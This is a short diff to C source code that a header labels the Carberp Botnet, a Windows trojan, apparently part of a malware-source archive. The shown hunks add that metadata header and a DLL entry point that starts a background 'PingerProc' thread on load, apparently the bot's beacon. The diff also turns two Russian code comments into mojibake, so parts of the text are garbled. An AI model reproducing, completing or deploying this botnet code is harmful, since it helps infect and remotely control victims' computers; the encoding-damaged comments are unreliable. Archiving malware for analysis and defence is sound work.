@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 #include <wininet.h>
 #include <stdlib.h>
@@ -184,14 +195,14 @@ bool ExistsSvchostAdmin()
 }
 
 #ifdef RELEASEDLL
-// Работаем в библиотеке
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 BOOL APIENTRY MyMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved)
 {
 	if (ul_reason_for_call == DLL_PROCESS_ATTACH)
 	{
-		// Стартуем поток отсука
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		DWORD lpThreadId; 
 		CreateThread( NULL, NULL, PingerProc, NULL, NULL, &lpThreadId );
 	}
